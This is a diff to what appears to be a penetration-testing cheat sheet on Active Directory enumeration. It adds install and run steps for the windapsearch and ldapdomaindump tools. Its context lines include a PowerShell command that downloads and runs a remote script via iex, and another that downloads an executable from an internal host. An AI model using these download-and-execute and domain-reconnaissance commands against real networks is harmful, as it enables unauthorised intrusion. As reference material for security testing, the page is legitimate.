@@ -66,6 +66,14 @@ Invoke-WebRequest -UseBasicParsing http://192.168.52.200/Tools/file.exe -OutFile
 
 ## Loading Enumeration Tools
 
+### [winapsearch](https://github.com/ropnop/windapsearch)
+
+```text
+git clone https://github.com/ropnop/windapsearch.git
+pip install python-ldap #or apt-get install python-ldap
+./windapsearch.py
+```
+
 ### [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
 ```text
@@ -83,7 +91,20 @@ powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.16
 
 ![](../../.gitbook/assets/image%20%28172%29.png)
 
+### [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
 
+```text
+git clone https://github.com/dirkjanm/ldapdomaindump.git
+#or
+pip install ldapdomaindump
+
+python ldapdomaindump.py
+#or
+python -m ldapdomaindump
+ldapdomaindump
+```
+
+### 
 
 ### [ADRecon](https://github.com/sense-of-security/ADRecon)
 
